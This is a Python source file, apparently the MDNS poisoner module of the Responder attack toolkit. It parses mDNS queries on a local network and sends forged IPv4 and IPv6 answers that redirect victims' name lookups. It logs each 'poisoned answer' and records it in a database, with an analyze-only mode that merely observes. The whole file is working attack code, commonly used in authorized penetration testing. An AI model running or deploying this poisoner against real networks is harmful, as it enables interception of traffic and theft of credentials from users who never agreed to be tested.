#! /usr/bin/env python3
import struct
import sys
LogDir = './logs/'
if (sys.version_info > (3, 0)):
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler
from bin.packets import MDNS_Ans, MDNS6_Ans
from bin.utils import *

def Parse_MDNS_Name(data):
	try:
		if (sys.version_info > (3, 0)):
			data = data[12:]
			NameLen = data[0]
			Name = data[1:1+NameLen]
			NameLen_ = data[1+NameLen]
			Name_ = data[1+NameLen:1+NameLen+NameLen_+1]
			FinalName = Name+b'.'+Name_
			return FinalName.decode("latin-1")
		else:
			data = NetworkRecvBufferPython2or3(data[12:])
			NameLen = struct.unpack('>B',data[0])[0]
			Name = data[1:1+NameLen]
			NameLen_ = struct.unpack('>B',data[1+NameLen])[0]
			Name_ = data[1+NameLen:1+NameLen+NameLen_+1]
			return Name+'.'+Name_

	except IndexError:
		return None


def Poisoned_MDNS_Name(data):
	data = NetworkRecvBufferPython2or3(data[12:])
	return data[:len(data)-5]

class MDNS(BaseRequestHandler):
	def handle(self):

		data, soc = self.request
		Request_Name = Parse_MDNS_Name(data)
		MDNSType = Parse_IPV6_Addr(data)
		# Break out if we don't want to respond to this host
		
		if (not Request_Name) or (RespondToThisHost(self.client_address[0], Request_Name) is not True):
			return None

		if settings.Config.AnalyzeMode:  # Analyze Mode
			print(text('[Analyze mode: MDNS] Request by %-15s for %s, ignoring' % (color(self.client_address[0], 3), color(Request_Name, 3))))
			SavePoisonersToDb({
						'Poisoner': 'MDNS', 
						'SentToIp': self.client_address[0], 
						'ForName': Request_Name,
						'AnalyzeMode': '1',
					})
		elif MDNSType == True:  # Poisoning Mode
			Poisoned_Name = Poisoned_MDNS_Name(data)
			Buffer = MDNS_Ans(AnswerName = Poisoned_Name)
			Buffer.calculate()
			soc.sendto(NetworkSendBufferPython2or3(Buffer), self.client_address)
			file = open(LogDir+'debug_log.log','a')
			file.write('\n[*] [MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0], Request_Name))
			file.close()
			#print(color('[*] [MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0], Request_Name), 2, 1))
			SavePoisonersToDb({
						'Poisoner': 'MDNS', 
						'SentToIp': self.client_address[0],
						'ForName': Request_Name,
						'AnalyzeMode': '0',
					})

		elif MDNSType == 'IPv6':  # Poisoning Mode
			Poisoned_Name = Poisoned_MDNS_Name(data)
			Buffer = MDNS6_Ans(AnswerName = Poisoned_Name)
			Buffer.calculate()
			soc.sendto(NetworkSendBufferPython2or3(Buffer), self.client_address)
			file = open(LogDir+'debug_log.log','a')
			file.write('\n[*] [MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0], Request_Name))
			file.close()
			#print(color('[*] [MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0], Request_Name), 2, 1))
			SavePoisonersToDb({
						'Poisoner': 'MDNS6', 
						'SentToIp': self.client_address[0], 
						'ForName': Request_Name,
						'AnalyzeMode': '0',
					})